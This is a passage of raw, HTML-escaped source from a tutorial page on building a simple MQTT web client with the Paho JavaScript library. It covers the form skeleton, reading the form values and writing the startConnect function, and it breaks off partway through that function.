punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
            &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Topic:&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
            &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;topic&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;topic&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;#&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
            &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;button&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token special-attr&quot;&gt;&lt;span class=&quot;token attr-name&quot;&gt;onclick&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token value javascript language-javascript&quot;&gt;&lt;span class=&quot;token function&quot;&gt;startConnect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;Connect&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
            &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;button&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token special-attr&quot;&gt;&lt;span class=&quot;token attr-name&quot;&gt;onclick&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token value javascript language-javascript&quot;&gt;&lt;span class=&quot;token function&quot;&gt;startDisconnect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;Disconnect&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
         &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;form&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
         &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;messages&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Currently, our web application has no functionality! When you click either button it does nothing! And it is not exactly sleek! But we will fix both those issues in the next sections.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/d161ccc3bc049ceef59faf8a38109ac0/e1031/finished-html-skeleton.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 46.202531645569614%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABV0lEQVQoz5WSyU4CQRCG51E9IC74BB5Eb3riFfQFUBY1M8JBTExM9OBCwJBBMkuYhaFnw1mY4bd7IKgxIdLJ11WVSlX+qm6Ob9zjuHQGyfDQU6wlA93DSekUG7l95AuHyO0c/GZ7bvOFIrb2jrC5W0Tn/QNctzfA49MbCCHQdQOmaUJRVOrraN094PziGpWqgGrtBlVqKxUBPH8LXmihXL5C/bKJWr1BaUJSNXBBFCOMIriui/GY4DMIkEwTxHGMdY83CcBZxMbzyytEUUS73cZwOMySaZoiSRgJZrMZjX+SLpj7LB/FU9jeBNyIqup0u5AkCYZhQFXVbGxN07I4DMOsYBXsxHQqhzU0LQKx3892FtBxfd/P+FaRLov+1ZBdsqxkqmRJhjWy1trbn4Zska7nI1yoYyOuUrNKoe364CZBiLHjg9CALZVZy6Yvvg6OhxFx6A8J8QUu5ZvlozWG9gAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;The basic HTML web application&quot;
        title=&quot;The basic HTML web application&quot;
        src=&quot;/static/d161ccc3bc049ceef59faf8a38109ac0/f058b/finished-html-skeleton.png&quot;
        srcset=&quot;/static/d161ccc3bc049ceef59faf8a38109ac0/c26ae/finished-html-skeleton.png 158w,
/static/d161ccc3bc049ceef59faf8a38109ac0/6bdcf/finished-html-skeleton.png 315w,
/static/d161ccc3bc049ceef59faf8a38109ac0/f058b/finished-html-skeleton.png 630w,
/static/d161ccc3bc049ceef59faf8a38109ac0/e1031/finished-html-skeleton.png 803w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;creating-the-javascript-code-for-mqtt&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#creating-the-javascript-code-for-mqtt&quot; aria-label=&quot;creating the javascript code for mqtt permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Creating the JavaScript Code for MQTT&lt;/h2&gt;
&lt;h4 id=&quot;js-fetching-the-values-from-the-form&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#js-fetching-the-values-from-the-form&quot; aria-label=&quot;js fetching the values from the form permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;JS: Fetching the values from the form&lt;/h4&gt;
&lt;p&gt;The first step to connecting to an MQTT broker is to fetch the information supplied by the user in the HTML form. This is easy using the &lt;code class=&quot;language-text&quot;&gt;document.getElementByID&lt;/code&gt; method. Luckily, we have already set the unique ID value in the HTML form, these were: &lt;code class=&quot;language-text&quot;&gt;host&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;port&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;topic&lt;/code&gt;. We can use the simple JavaScript code below to save these values from the form into JavaScript variables with the same naming convention.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;js&quot;&gt;&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;host &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;host&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;value&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
port &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;port&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;value&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
topic &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;topic&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;value&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;js-writing-the-startconnect-function&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#js-writing-the-startconnect-function&quot; aria-label=&quot;js writing the startconnect function permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;JS: Writing the &lt;code class=&quot;language-text&quot;&gt;startConnect&lt;/code&gt; function&lt;/h4&gt;
&lt;p&gt;Now that we have the required variables we can begin writing the code for the MQTT subscription. The first thing we should do is generate a &lt;em&gt;client ID&lt;/em&gt; value. This can essentially be any string of characters and/or numbers but &lt;strong&gt;it must be unique&lt;/strong&gt;. We can simply leverage the &lt;code class=&quot;language-text&quot;&gt;Math.random&lt;/code&gt; function to generate a random number and concatenate it to a string value of &lt;code class=&quot;language-text&quot;&gt;&quot;clientID_&quot;&lt;/code&gt;. This will result in something like: &lt;code class=&quot;language-text&quot;&gt;clientID-62&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;js&quot;&gt;&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Generate a random client ID&lt;/span&gt;
clientID &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;clientID_&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Math&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have all the information required to connect to the MQTT broker: 1) The hostname/IP address; 2) The port number; and 3) The random clientID string. We can call the &lt;code class=&quot;language-text&quot;&gt;Paho.MQTT.Client&lt;/code&gt; method using these three variables. To make sure we are passing an integer as the port number, simple intcast the variable &lt;code class=&quot;language-text&quot;&gt;port&lt;/code&gt; using &lt;code class=&quot;language-text&quot;&gt;Number(port)&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;js&quot;&gt;&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Initialize new Paho client connection&lt;/span&gt;
client &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Paho&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;MQTT&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Client&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;host&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;Number&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;port&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; clientID&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;After the connection to the MQTT broker has been specified and the &lt;code class=&quot;language-text&quot;&gt;client&lt;/code&gt; object created, we can set the callback handlers for the client. These functions will be called if something goes wrong; for example, if the connection to the MQTT broker is lost, or when an MQTT message has arrived. We will write these functions later.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;js&quot;&gt;&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Set callback handlers&lt;/span&gt;
client&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;onConnectionLost &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; onConnectionLost&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
client&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;onMessageArrived &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; onMessageArrived&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Finally, we can specify the &lt;code class=&quot;language-text&quot;&gt;client&lt;/code&gt; to connect. In this piece of code, we have an &lt;code class=&quot;language-text&quot;&gt;onSuccess&lt;/code&gt; action. When the connection works, the &lt;code class=&quot;language-text&quot;&gt;onConnect&lt;/code&gt; function is called. This will be where we subscribe to a specific topic. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;js&quot;&gt;&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Connect the client, if successful, call onConnect function&lt;/span&gt;
client&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; 
    onSuccess&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; onConnect&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    onFailure&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;messages&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&amp;lt;span&gt;ERROR: Connection to: &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; host &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos; on port: &apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; port &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos; failed.&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;One more thing, there is also an &lt;code class=&quot;language-text&quot;&gt;onFailure&lt;/code&gt; action in the &lt;code class=&quot;language-text&quot;&gt;onConnect&lt;/code&gt; function. When the connection fails, the &lt;em&gt;messages&lt;/em&gt; div in the webpage will display an error to the user. This is a simple, no jQuery solution. Basically, the &lt;code class=&quot;language-text&quot;&gt;document.getElementById(&quot;messages&quot;)&lt;/code&gt; will identify the &lt;em&gt;messages&lt;/em&gt; div, the &lt;code class=&quot;language-text&quot;&gt;.innerHTML +=&lt;/code&gt; will append text to the div, and &lt;code class=&quot;language-text&quot;&gt;&apos;&amp;lt;span&gt;ERROR: Connection to: &apos; + host + &apos; on port: &apos; + port + &apos; failed.&amp;lt;/span&gt;&amp;lt;br/&gt;&apos;&lt;/code&gt; will print an error message which also documents the hostname/IP and port number.&lt;/p&gt;
&lt;p&gt;It is very common for error messages like this to be handled and displayed using the JavaScript &lt;code class=&quot;language-text&quot;&gt;console.log(message)&lt;/code&gt; solution. However, this is only displayed in the web browser console, which some end-users have no knowledge of. So instead, we will display the error message on the actual web page itself.&lt;/p&gt;
&lt;p&gt;The final, completed, &lt;code class=&quot;language-text&quot;&gt;startConnect&lt;/code&gt; function is displayed below. Not how we use the same &lt;code class=&quot;language-text&quot;&gt;innerHTML +=&lt;/code&gt; solution to display the connection information in the full example below. This, again, provides feedback to the end-user.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;js&quot;&gt;&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Called after form input is processed&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;startConnect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// Generate a random client ID&lt;/span&gt;
    clientID &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;clientID_&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Math&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// Fetch the hostname/IP address and port number from the form&lt;/span&gt;
    host &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;host&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;value&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    port &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;port&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;value&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// Print output for the user in the messages div&lt;/span&gt;
